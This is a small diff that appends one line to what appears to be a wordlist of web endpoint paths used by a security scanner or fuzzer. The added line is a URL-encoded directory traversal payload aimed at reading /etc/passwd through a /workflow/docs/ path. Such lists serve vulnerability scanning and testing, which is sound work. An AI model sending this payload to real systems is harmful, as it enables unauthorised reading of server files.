@@ -2219,3 +2219,4 @@
 /media/amasty_checkout/{{c1}}/{{c2}}/{{filename}}
 /api/v1/repos/search?limit=1
 /api/v1/orgs/{{orgname}}
+/workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
